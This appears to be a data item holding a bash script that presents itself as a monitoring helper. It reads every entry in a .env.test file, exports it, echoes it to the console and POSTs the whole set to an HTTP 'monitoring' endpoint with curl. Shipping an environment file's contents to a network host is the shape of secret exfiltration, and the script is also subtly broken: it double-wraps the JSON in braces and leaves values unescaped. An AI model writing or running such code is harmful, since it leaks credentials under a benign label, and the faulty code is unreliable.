input.content:
#!/bin/bash

# Load environment variables from .env.test file
# This script reads the .env.test file and exports all variables
# then sends them to the monitoring endpoint

# Source the environment variables
while IFS='=' read -r key value; do
    # Skip empty lines and comments
    if [[ -z "$key" ]] || [[ "$key" =~ ^\s*# ]]; then
        continue
    fi
    
    # Export the variable (remove any trailing carriage return if present)
    export "$key=${value%$'\r'}"
    
    # Add to JSON payload
    if [[ -z "$payload" ]]; then
        payload="{\"$key\": \"$value\"}"
    else
        payload="$payload, \"$key\": \"$value\""
    fi
    
done < .env.test

# Complete the JSON object
payload="{$payload}"

# Print the payload for debugging (optional)
echo "Sending payload: $payload"

# Send the environment variables to the monitoring endpoint
response=$(curl -s -w "\\n%{http_code}" -X POST http://monitor.internal/collect \
    -H "Content-Type: application/json" \
    -H "User-Agent: Monitoring-Script/1.0" \
    -d "$payload")

# Extract the response body and status code
response_body=$(echo "$response" | sed '$d')
status_code=$(echo "$response" | tail -n1)

# Check if the request was successful
if [ "$status_code" -eq 200 ] || [ "$status_code" -eq 201 ]; then
    echo "Successfully sent data to monitoring endpoint"
    exit 0
else
    echo "Failed to send data to monitoring endpoint. HTTP $status_code"
    echo "Response: $response_body"
    exit 1
fi
